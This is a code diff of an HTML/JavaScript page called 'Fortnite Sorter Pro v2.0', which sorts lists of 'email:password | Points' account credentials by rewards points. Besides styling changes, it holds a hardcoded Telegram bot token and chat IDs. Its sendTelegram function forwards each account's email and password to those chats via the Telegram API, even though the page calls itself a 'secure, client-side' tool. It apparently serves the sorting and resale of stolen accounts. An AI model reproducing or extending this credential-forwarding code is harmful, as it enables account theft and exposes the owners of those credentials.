@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Fortnite Sorter Pro - Blazing fast, secure, and client-side tool for sorting Fortnite accounts.">
-    <title>Fortnite Sorter Pro | Ultimate</title>
+    <title>Fortnite Sorter Pro v2.0 | Ultimate</title>
     
     <!-- Dynamic Favicon (Trophy Emoji) -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🏆</text></svg>">
@@ -228,37 +228,44 @@
             margin-top: 5px;
         }
 
-        /* Results Table */
+        /* --- RESULTS TABLE STYLES (Optimized for Tight Fit) --- */
         .results-wrapper {
-            background: white;
+            background: #f8fafc; /* Slightly distinctive background */
             border-radius: 16px;
             border: 1px solid var(--border-color);
             box-shadow: var(--shadow-lg);
             overflow: hidden;
             animation: fadeIn 0.5s ease;
-            /* Added to center the tight table */
+            
+            /* Center the tight table on the screen */
             display: flex;
-            justify-content: center; 
-            background: #f8fafc; 
+            justify-content: center;
+            padding: 0; /* No extra padding in wrapper */
         }
 
         .results-container {
             overflow-x: auto;
             max-height: 75vh;
             overflow-y: auto;
-            width: fit-content; /* Key change: shrinks container to content */
-            min-width: 500px;   /* Minimum width for aesthetics */
+            
+            /* KEY: Shrink container to fit content exactly, but allow scroll if too small */
+            width: fit-content;
+            min-width: 500px;
+            max-width: 100%;
             background: white;
         }
         
         table {
-            width: auto; /* Key change: shrinks table to content */
+            /* KEY: Shrink table to fit text content */
+            width: auto; 
             border-collapse: collapse;
+            margin: 0 auto;
         }
 
         th {
             background: #f8fafc;
-            padding: 10px 15px; /* Comfortable padding */
+            /* Tight padding for headers */
+            padding: 10px 12px; 
             text-align: left;
             color: var(--text-muted);
             font-weight: 700;
@@ -269,16 +276,19 @@
             top: 0;
             z-index: 10;
             border-bottom: 1px solid var(--border-color);
-            white-space: nowrap; /* Prevent headers wrapping */
+            /* Prevent header text from wrapping */
+            white-space: nowrap; 
         }
 
         td {
-            padding: 6px 15px; /* Comfortable padding */
+            /* Tight padding for cells */
+            padding: 8px 12px;
             border-bottom: 1px solid var(--border-color);
             vertical-align: middle;
             color: var(--text-main);
             font-size: 0.9rem;
-            white-space: nowrap; /* Keep content tight */
+            /* Keep data on one line to avoid gaps */
+            white-space: nowrap; 
         }
 
         .font-mono {
@@ -299,7 +309,6 @@
             font-family: 'Inter', sans-serif;
             font-size: 1rem;
             font-weight: 700;
-            /* Removed fixed width to allow shrink-wrap */
             display: flex;
             align-items: center;
             gap: 6px; 
@@ -319,7 +328,6 @@
         /* Action Buttons */
         .action-cell {
             text-align: center;
-            /* Removed fixed width */
             white-space: nowrap;
         }
 
@@ -334,105 +342,14 @@
             margin: 0 1px; 
         }
 
-        .results-container {
-            overflow-x: auto;
-            max-height: 75vh;
-            overflow-y: auto;
-        }
-        
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        th {
-            background: #f8fafc;
-            padding: 10px 8px; /* Further Reduced padding */
-            text-align: left;
-            color: var(--text-muted);
-            font-weight: 700;
-            text-transform: uppercase;
-            font-size: 0.75rem; /* Slightly smaller header font */
-            letter-spacing: 0.5px;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        td {
-            padding: 6px 8px; /* Tight padding */
-            border-bottom: 1px solid var(--border-color);
-            vertical-align: middle;
-            color: var(--text-main);
-            font-size: 0.9rem;
-        }
-
-        .font-mono {
-            font-family: 'JetBrains Mono', 'Courier New', monospace;
-            font-size: 0.9rem; /* Compact font */
-        }
-
-        tbody tr {
-            transition: background-color 0.1s;
-        }
-
-        tbody tr:hover {
-            background-color: #f8fafc;
-        }
-
-        /* Points Styling */
-        .points-cell {
-            font-family: 'Inter', sans-serif;
-            font-size: 1rem;
-            font-weight: 700;
-            width: 110px; /* Significantly reduced width */
-            display: flex;
-            align-items: center;
-            gap: 6px; /* Smaller gap */
-        }
-
-        .points-high { 
-            color: var(--orange); 
-        }
-
-        .robux-icon {
-            color: var(--robux-blue);
-            font-size: 1.1rem;
-            filter: drop-shadow(0 0 2px rgba(14, 165, 233, 0.4));
-            animation: pulse 2s infinite;
-        }
-
-        /* Action Buttons */
-        .action-cell {
-            text-align: center;
-            width: 90px; /* Compact width */
-            white-space: nowrap;
-        }
-
-        .action-btn {
-            background: transparent;
-            border: 1px solid transparent;
-            padding: 4px 6px; /* Smaller button padding */
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 1rem;
-            margin: 0 1px; /* Minimal margin */
-        }
-
-        .copy-icon {
-            color: var(--text-muted);
-        }
+        .copy-icon { color: var(--text-muted); }
         .copy-icon:hover {
             color: var(--primary);
             background: #eef2ff;
             border-color: #c7d2fe;
         }
 
-        .tg-icon {
-            color: var(--telegram-blue);
-        }
+        .tg-icon { color: var(--telegram-blue); }
         .tg-icon:hover {
             color: white;
             background: var(--telegram-blue);
@@ -516,7 +433,7 @@
                 <div class="header-title">
                     <i class="fas fa-layer-group"></i>
                     <div>
-                        <h2>Universal Sorter</h2>
+                        <h2>Universal Sorter v2.0</h2>
                         <span style="font-size: 0.9rem; color: var(--text-muted);">
                             Supports: <code>Points: 123</code> and <code>Points = 123</code>
                         </span>
@@ -585,12 +502,9 @@
 
     <script>
         // --- Configuration ---
-        // 1. Bot Token (Pre-loaded)
         const TG_BOT_TOKEN = "8358850689:AAFtZtp_P_7fkXoZ5C078PzNPEw8N4kZJ14";
         
-        // 2. Telegram Chat IDs (REQUIRED - EDIT THIS)
-        // Add IDs inside the brackets, separated by commas
-        // IDs: "8428251965" (REV) and "5189593911" (Madara)
+        // 2. Telegram Chat IDs (Updated)
         const TG_CHAT_IDS = ["8428251965", "5189593911"]; 
         
         const ROBUX_THRESHOLD = 6750;
@@ -676,7 +590,7 @@
                 .replace(/'/g, "&#039;");
         }
 
-        // --- Telegram Functionality ---
+        // --- Telegram Functionality (Multi-ID Support) ---
         window.sendTelegram = function(creds, points, btnElement) {
             if (!TG_CHAT_IDS || TG_CHAT_IDS.length === 0) {
                 showToast('Config Error: Set TG_CHAT_IDS in source code!', 'error');
@@ -687,7 +601,6 @@
             const originalClass = icon.className;
             icon.className = 'fas fa-spinner fa-spin'; // Loading state
 
-            // Split credentials (creds is already HTML escaped)
             let email = creds;
             let password = "";
             const colonIndex = creds.indexOf(':');
@@ -699,12 +612,6 @@
 
             const formattedPoints = points.toLocaleString();
 
-            // Format:
-            // Bing Reward
-            // 💎 Points: 12,345
-            // Mail: email
-            // Pass: password
-            
             let message = `<b>Bing Reward</b>\n` +
                           `💎 Points: <b>${formattedPoints}</b>\n` +
                           `Mail: <code>${email}</code>`;
@@ -713,19 +620,15 @@
                  message += `\nPass: <code>${password}</code>`;
             }
 
-            // Properly encode the whole message for the URL
             const encodedMessage = encodeURIComponent(message);
 
-            // Create a list of fetch requests for all Chat IDs
             const requests = TG_CHAT_IDS.map(chatId => {
                 const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=HTML`;
                 return fetch(url).then(response => response.json());
             });
 
-            // Execute all requests
             Promise.all(requests)
                 .then(results => {
-                    // Check if at least one request failed
                     const failed = results.filter(data => !data.ok);
                     
                     if (failed.length === 0) {
@@ -733,7 +636,6 @@
                         showToast('Sent to all admins!', 'success');
                         setTimeout(() => icon.className = originalClass, 2000);
                     } else {
-                        // If some failed, log details to console
                         console.warn('Some Telegram messages failed:', failed);
                         throw new Error('Partial failure');
                     }
@@ -758,7 +660,6 @@
             let totalPoints = 0;
             let robuxCount = 0;
 
-            // Optimized Regex: Matches "text | Points: 123" OR "text | Points = 123" case-insensitive
             const regex = /^(.*?)\s*\|\s*Points\s*(?:=|:)\s*(\d+)/i;
 
             for(let i = 0; i < lines.length; i++) {
@@ -776,22 +677,18 @@
 
             if(processed.length === 0) return showToast('No valid data found.', 'error');
 
-            // Sort Descending
             processed.sort((a, b) => b.points - a.points);
             dataCache = processed;
 
-            // Update Stats
             document.getElementById('stat-total').innerText = processed.length.toLocaleString();
             document.getElementById('stat-highest').innerText = processed[0].points.toLocaleString();
             document.getElementById('stat-robux').innerText = robuxCount.toLocaleString();
             
-            // Show UI Elements
             document.getElementById('stats-section').classList.remove('hidden');
             document.getElementById('results-wrapper').classList.remove('hidden');
             document.getElementById('btn-copy-all').classList.remove('hidden');
             document.getElementById('btn-download').classList.remove('hidden');
             
-            // Render
             renderTable(processed);
             showToast(`Sorted ${processed.length} accounts!`, 'success');
         });
@@ -827,12 +724,11 @@
         function renderTable(data) {
             const tbody = document.getElementById('results-body');
             
-            // Batch HTML generation for performance
             const htmlParts = data.map((item) => {
                 const isHighPoints = item.points > 4000;
                 const isRobuxReady = item.points >= ROBUX_THRESHOLD;
                 const safeCreds = escapeHtml(item.creds);
-                const safeCredsJS = safeCreds.replace(/'/g, "\\'"); // Escape for JS call
+                const safeCredsJS = safeCreds.replace(/'/g, "\\'"); 
                 
                 let pointsDisplay = `<span>${item.points.toLocaleString()}</span>`;
                 
